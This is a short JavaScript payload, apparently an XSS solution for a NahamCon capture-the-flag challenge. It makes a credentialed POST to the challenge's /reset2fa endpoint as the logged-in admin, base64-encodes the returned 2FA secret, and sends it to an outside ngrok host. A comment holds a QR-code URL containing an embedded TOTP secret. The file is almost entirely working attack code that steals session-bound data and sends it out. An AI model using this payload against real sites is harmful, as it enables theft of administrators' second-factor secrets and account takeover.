// Extract 2fa code from admin, can then generate QR code for GAuth (update the secret)
// https://www.google.com/chart?chs=200x200&chld=M%7C0&cht=qr&chl=otpauth://totp/Fort%20Knox:admin?secret=APJ5VXIQVMM5UF6X&issuer=Fort%20Knox
var xhr = new XMLHttpRequest();
xhr.open("POST","http://challenge.nahamcon.com:30666/reset2fa", true);
xhr.withCredentials = true
xhr.onload = function(){
    var flag = btoa(xhr.responseText);
    var exfil = new XMLHttpRequest();
    exfil.open("GET","http://b6a5-81-103-153-174.ngrok.io/?flag=" + flag);
    exfil.send();
};
xhr.send();